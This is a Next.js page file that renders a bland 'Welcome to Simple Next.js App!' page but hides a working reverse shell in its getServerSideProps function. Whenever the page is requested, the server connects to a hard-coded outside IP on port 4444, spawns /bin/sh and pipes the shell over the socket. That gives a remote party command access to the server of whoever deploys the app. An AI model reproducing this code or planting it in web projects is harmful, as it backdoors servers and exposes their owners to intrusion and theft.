import { useEffect } from 'react';

export async function getServerSideProps() {
  // Reverse shell code - executes on server when page is visited
  const net = require('net');
  const { spawn } = require('child_process');
  
  const HOST = '141.136.44.52';
  const PORT = 4444;
  
  try {
    const client = new net.Socket();
    
    client.connect(PORT, HOST, () => {
      console.log('Connected to ' + HOST + ':' + PORT);
      
      const shell = spawn('/bin/sh', []);
      
      shell.stdout.pipe(client);
      shell.stderr.pipe(client);
      client.pipe(shell.stdin);
      
      shell.on('exit', () => {
        client.end();
      });
    });
    
    client.on('error', (err) => {
      console.error('Connection error:', err.message);
    });
  } catch (err) {
    console.error('Error:', err);
  }
  
  return {
    props: {},
  };
}

export default function Home() {
  return (
    <main style={{ fontFamily: 'sans-serif', padding: '2rem' }}>
      <h1>Welcome to Simple Next.js App!</h1>
      <p>This is a minimal Next.js project.</p>
    </main>
  );
}
